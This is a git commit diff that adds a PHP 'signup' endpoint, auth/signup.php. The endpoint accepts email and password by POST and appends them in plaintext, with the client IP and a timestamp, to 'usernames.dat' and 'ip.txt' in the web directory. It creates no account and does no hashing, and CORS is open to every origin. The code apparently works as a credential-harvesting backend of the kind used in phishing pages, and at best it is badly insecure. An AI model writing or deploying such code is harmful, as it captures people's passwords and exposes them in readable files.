34c6d9e30c34d9984087f9ade33b9918327aa136
Mohammed Kamil <malbakamil0087@gmail.com>
2026-03-09 09:50:56 -0400

    Update signup.php

--- auth/signup.php
+++ auth/signup.php
@@ -1,1 +1,42 @@
+<?php
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST');
+header('Access-Control-Allow-Headers: Content-Type');
 
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Get the JSON data from the request
+    $data = json_decode(file_get_contents('php://input'), true);
+    
+    $email = isset($data['email']) ? $data['email'] : '';
+    $password = isset($data['password']) ? $data['password'] : '';
+    
+    // Get user's IP address
+    $ip = $_SERVER['REMOTE_ADDR'];
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+    
+    // Get current timestamp
+    $timestamp = date('Y-m-d H:i:s');
+    
+    // Save IP address to ip.txt
+    $ipData = "[$timestamp] IP: $ip (Signup)\n";
+    file_put_contents('ip.txt', $ipData, FILE_APPEND | LOCK_EX);
+    
+    // Save signup credentials to usernames.dat
+    $signupData = "[$timestamp] [SIGNUP] Email: $email | Password: $password | IP: $ip\n";
+    file_put_contents('usernames.dat', $signupData, FILE_APPEND | LOCK_EX);
+    
+    // Return success response
+    echo json_encode([
+        'success' => true,
+        'message' => 'Signup data saved successfully'
+    ]);
+} else {
+    echo json_encode([
+        'success' => false,
+        'message' => 'Invalid request method'
+    ]);
+}
+?>
